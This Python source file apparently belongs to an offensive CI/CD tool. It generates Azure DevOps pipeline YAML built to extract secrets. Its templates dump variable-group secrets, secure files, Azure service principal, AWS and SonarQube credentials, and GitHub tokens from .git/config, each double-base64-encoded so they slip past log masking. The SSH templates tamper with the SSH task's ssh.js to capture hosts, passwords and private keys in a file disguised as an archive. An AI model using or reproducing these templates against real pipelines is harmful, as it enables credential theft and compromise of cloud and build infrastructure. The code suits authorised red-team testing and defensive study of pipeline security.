from nordstream.yaml.generator import YamlGeneratorBase
from nordstream.utils.constants import DEFAULT_TASK_NAME


class DevOpsPipelineGenerator(YamlGeneratorBase):
    taskName = DEFAULT_TASK_NAME
    _defaultTemplate = {
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {
                "task": "Bash@3",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": "env -0 | awk -v RS='\\0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0 ; echo ",
                },
                "env": "#FIXME",
            }
        ],
        "trigger": "none",
        "variables": [{"group": "#FIXME"}],
    }
    _secureFileTemplate = {
        "pool": {"vmImage": "ubuntu-latest"},
        "trigger": "none",
        "steps": [
            {
                "task": "DownloadSecureFile@1",
                "name": "secretFile",
                "inputs": {"secureFile": "#FIXME"},
            },
            {
                "script": "cat $(secretFile.secureFilePath) | base64 -w0 | base64 -w0; echo",
                "displayName": taskName,
            },
        ],
    }
    _serviceConnectionTemplateAzureRM = {
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {
                "task": "AzureCLI@2",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "addSpnToEnvironment": True,
                    "scriptType": "bash",
                    "scriptLocation": "inlineScript",
                    "azureSubscription": "#FIXME",
                    "inlineScript": (
                        'sh -c "env | grep \\"^servicePrincipal\\" | base64 -w0 |' ' base64 -w0; echo  ;"'
                    ),
                },
            }
        ],
        "trigger": "none",
    }
    _serviceConnectionTemplateGitHub = {
        "pool": {"vmImage": "ubuntu-latest"},
        "resources": {
            "repositories": [
                {
                    "repository": "devRepo",
                    "type": "github",
                    "endpoint": "None",
                    "name": "microsoft/azure-pipelines-tasks",
                }
            ]
        },
        "steps": [
            {"checkout": "devRepo", "persistCredentials": True},
            {
                "task": "Bash@3",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": 'sh -c "cat ./.git/config | base64 -w0 | base64 -w0; echo  ;"',
                },
            },
        ],
        "trigger": "none",
    }

    _serviceConnectionTemplateAWS = {
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {
                "task": "AWSShellScript@1",
                "displayName": taskName,
                "inputs": {
                    # "regionName": "#FIXME",
                    "awsCredentials": "#FIXME",
                    "scriptType": "inline",
                    "inlineScript": (
                        'sh -c "env | grep -E \\"(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID)\\" | base64 -w0 |'
                        ' base64 -w0; echo  ;"'
                    ),
                },
            }
        ],
        "trigger": "none",
    }

    _serviceConnectionTemplateSonar = {
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {
                "task": "SonarQubePrepare@6",
                "inputs": {"SonarQube": "#FIXME", "scannerMode": "CLI", "projectKey": "sonarqube"},
            },
            {
                "task": "Bash@3",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": "sh -c 'env | grep SONARQUBE_SCANNER_PARAMS | base64 -w0 | base64 -w0; echo ;'",
                },
            },
        ],
        "trigger": "none",
    }

    _serviceConnectionTemplateSSH = {
        "trigger": "none",
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {"checkout": "none"},
            {
                "script": 'SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js) ; cp $SSH_FILE $SSH_FILE.bak ; sed -i \'s|const readyTimeout = getReadyTimeoutVariable();|const readyTimeout = getReadyTimeoutVariable();\\nconst fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("/tmp/artefacts.tar.gz", data, (err) => {});|\' $SSH_FILE',
                "displayName": f"Preparing {taskName}",
            },
            {"task": "SSH@0", "inputs": {"sshEndpoint": "#FIXME", "runOptions": "commands", "commands": "sleep 1"}},
            {
                "script": "SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js); mv $SSH_FILE.bak $SSH_FILE ; cat /tmp/artefacts.tar.gz | base64 -w0 | base64 -w0 ; echo ''; rm /tmp/artefacts.tar.gz",
                "displayName": taskName,
            },
        ],
    }

    _serviceConnectionTemplateSSHWindows = {
        "trigger": "none",
        "pool": {"vmImage": "windows-latest"},
        "steps": [
            {"checkout": "none"},
            {
                "task": "PowerShell@2",
                "inputs": {
                    "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; copy $p $p+".bak"; (Get-Content -Path $p -Raw) -replace [regex]::Escape(\'const readyTimeout = getReadyTimeoutVariable();\'), \'const readyTimeout = getReadyTimeoutVariable();const fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("artefacts.tar.gz", data, (err) => {});\' | Set-Content -Path $p }',
                    "targetType": "inline",
                },
            },
            {"task": "SSH@0", "inputs": {"sshEndpoint": "#FIXME", "runOptions": "commands", "commands": "sleep 1"}},
            {
                "task": "PowerShell@2",
                "inputs": {
                    "script": '$encodedOnce = [Convert]::ToBase64String([IO.File]::ReadAllBytes("artefacts.tar.gz"));$encodedTwice = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($encodedOnce));echo $encodedTwice; echo \'\'; rm artefacts.tar.gz; Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; mv -force $p+".bak" $p ;}',
                    "targetType": "inline",
                },
                "displayName": taskName,
            },
        ],
    }

    def generatePipelineForSecretExtraction(self, variableGroup):
        self.addVariableGroupToYaml(variableGroup.get("name"))
        self.addSecretsToYaml(variableGroup.get("variables"))

    def generatePipelineForSecureFileExtraction(self, secureFile):
        self._defaultTemplate = self._secureFileTemplate
        self.__setSecureFile(secureFile)

    def generatePipelineForAzureRm(self, azureSubscription):
        self._defaultTemplate = self._serviceConnectionTemplateAzureRM
        self.__setAzureSubscription(azureSubscription)

    def generatePipelineForGitHub(self, endpoint):
        self._defaultTemplate = self._serviceConnectionTemplateGitHub
        self.__setGitHubEndpoint(endpoint)

    def generatePipelineForAWS(self, awsCredentials):
        self._defaultTemplate = self._serviceConnectionTemplateAWS
        # self.__setAWSRegion(regionName)
        self.__setAWSCredential(awsCredentials)

    def generatePipelineForSonar(self, sonarSCName):
        self._defaultTemplate = self._serviceConnectionTemplateSonar
        self.__setSonarServiceConnectionName(sonarSCName)

    def generatePipelineForSSH(self, sshSCName):
        self._defaultTemplate = self._serviceConnectionTemplateSSH
        self.__setSSHServiceConnectionName(sshSCName)

    def addVariableGroupToYaml(self, variableGroupName):
        self._defaultTemplate.get("variables")[0]["group"] = variableGroupName

    def addSecretsToYaml(self, secrets):
        self._defaultTemplate.get("steps")[0]["env"] = {}
        for sec in secrets:
            key = f"secret_{sec}"
            value = f"$({sec})"
            self._defaultTemplate.get("steps")[0].get("env")[key] = value

    def __setSecureFile(self, secureFile):
        self._defaultTemplate.get("steps")[0].get("inputs")["secureFile"] = secureFile

    def __setAzureSubscription(self, azureSubscription):
        self._defaultTemplate.get("steps")[0].get("inputs")["azureSubscription"] = azureSubscription

    def __setGitHubEndpoint(self, endpoint):
        self._defaultTemplate.get("resources").get("repositories")[0]["endpoint"] = endpoint

    def __setAWSRegion(self, regionName):
        self._defaultTemplate.get("steps")[0].get("inputs")["regionName"] = regionName

    def __setAWSCredential(self, awsCredentials):
        self._defaultTemplate.get("steps")[0].get("inputs")["awsCredentials"] = awsCredentials

    def __setSonarServiceConnectionName(self, scName):
        self._defaultTemplate.get("steps")[0].get("inputs")["SonarQube"] = scName

    def __setSSHServiceConnectionName(self, sshName):
        self._defaultTemplate.get("steps")[2].get("inputs")["sshEndpoint"] = sshName
